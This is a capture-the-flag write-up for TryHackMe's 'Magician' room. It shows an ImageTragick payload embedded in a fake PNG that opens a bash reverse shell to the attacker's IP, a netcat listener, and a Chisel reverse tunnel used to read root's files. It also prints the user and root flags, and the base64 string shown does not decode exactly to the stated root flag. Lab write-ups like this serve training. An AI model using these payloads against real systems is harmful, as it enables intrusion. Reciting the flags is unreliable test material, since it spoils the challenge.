
##  Magician — TryHackMe Writeup



<img width="1770" height="330" alt="Screenshot 2025-11-11 171958" src="https://github.com/user-attachments/assets/33b35402-1395-46f8-8c6c-5f1b1dc0aff0" />



A magical image conversion site hides a vulnerable backend and a mysterious cat. Let’s unravel the illusion.

---

###  Setup and Port Scan

After booting the machine, we’re given the target IP: `10.201.38.201`. The challenge asks us to map this IP to the hostname `magician` in `/etc/hosts`:

```
10.201.38.201 magician
```


<img width="931" height="247" alt="Screenshot 2025-11-11 171757" src="https://github.com/user-attachments/assets/ad9c57f9-b928-485b-98dc-9c6796793cd8" />



Then we scan for open ports:

```bash
nmap 10.201.38.201
```


<img width="731" height="207" alt="Screenshot 2025-11-11 172117" src="https://github.com/user-attachments/assets/bfe95d06-9349-4521-b45f-038ea8258ed4" />



**Results:**

- Port 21 → FTP
- Port 8080 → HTTP Proxy (White-label error)
- Port 8081 → Web app

---

###  FTP Access and Initial Clue

Connected to FTP using anonymous login:

```bash
ftp magician
```

Login succeeded, and we got this message:

> “You're quite the patient one… check out https://imagetragick.com”



<img width="699" height="287" alt="Screenshot 2025-11-11 172441" src="https://github.com/user-attachments/assets/098ce440-71e5-42d0-9866-d340a08f317d" />




This hints at the ImageMagick vulnerability (CVE-2016–3714).

---

###  Web App on Port 8081



<img width="1920" height="1080" alt="Screenshot_2025-11-11_17_49_54" src="https://github.com/user-attachments/assets/4b91c9ee-2c8a-49fd-a4ef-e46802631bb4" />



The site offers a PNG-to-JPG converter.
I tried extension-based RCE — no luck. Based on the FTP hint, I crafted a payload PNG using heredoc:

```bash
cat > img.png << EOF
push graphic-context
viewbox 0 0 1 1
image over 0,0 1,1 ' |/bin/bash -i >& /dev/tcp/10.17.1.102/4444 0>&1'
pop graphic-context
EOF
```


<img width="756" height="162" alt="Screenshot 2025-11-11 175628" src="https://github.com/user-attachments/assets/cd2ab46d-1a3f-4188-af30-5386f672104c" />



Started a netcat listener:

```bash
nc -lvnp 4444
```

Uploaded the PNG — and boom! Shell access as `magician`.


<img width="874" height="215" alt="Screenshot 2025-11-11 175806" src="https://github.com/user-attachments/assets/9eb2c3c1-8fad-44c8-97ba-0e1c8d46542d" />


---

###  Shell Enumeration

Navigated to `/home/magician` and found our first flag :

```bash
cat user.txt
```


<img width="600" height="394" alt="Screenshot 2025-11-11 175954" src="https://github.com/user-attachments/assets/af50f056-4b6b-4ec4-8307-fc72e6bd930c" />



**User Flag :** `THM{simsalabim_hex_hex}`

Also found a file named `the_magic_continues`:

```bash
cat the_magic_continues
```


<img width="954" height="64" alt="Screenshot 2025-11-11 180303" src="https://github.com/user-attachments/assets/7b19cfb0-13a1-4f41-94b3-9f0d7a10b34f" />


> “The magician keeps a locally listening cat… an oracle on port 6666.”


Checked open ports — confirmed something was listening on `127.0.0.1:6666`.

---

###  Pivoting with Chisel

To access the localhost service, I used **Chisel**:

Chisel  is a fast TCP/UDP tunneling tool that allows you to securely tunnel traffic over HTTP, often used to bypass firewalls or pivot within networks.

1. Started an HTTP server on my machine (port 3173)
2. Transferred Chisel to the target using `wget`
3. Made it executable
4. Started Chisel server:

```bash
./chisel server --reverse --port 3173
```

5. On target, ran:

```bash
./chisel client 10.17.1.102:3173 R:4433:127.0.0.1:6666
```

Now I could access `http://localhost:4433` — a new web app appeared.


<img width="504" height="565" alt="Screenshot 2025-11-11 182259" src="https://github.com/user-attachments/assets/97499595-0afd-4330-a707-bbbd6efae941" />



---

###  The Magic Cat

The app asked for a filename. I entered:

```
/root/root.txt
```

Got a base64 string:

```
VEhNe21hZ21jX21heV9tYWt1X21hbn1fbWVuX21hZHOK
```


<img width="1544" height="364" alt="Screenshot 2025-11-11 182429" src="https://github.com/user-attachments/assets/b6fe4e91-551b-4d52-aaeb-d53433abe9ee" />



Decoded it using CyberChef.

**Root Flag:** `THM{magic_may_make_many_men_mad}`

---

###  Challenge Complete

- **User Flag:** `THM{simsalabim_hex_hex}`
- **Root Flag:** `THM{magic_may_make_many_men_mad}`

That’s it — magician exposed, secrets revealed.

---

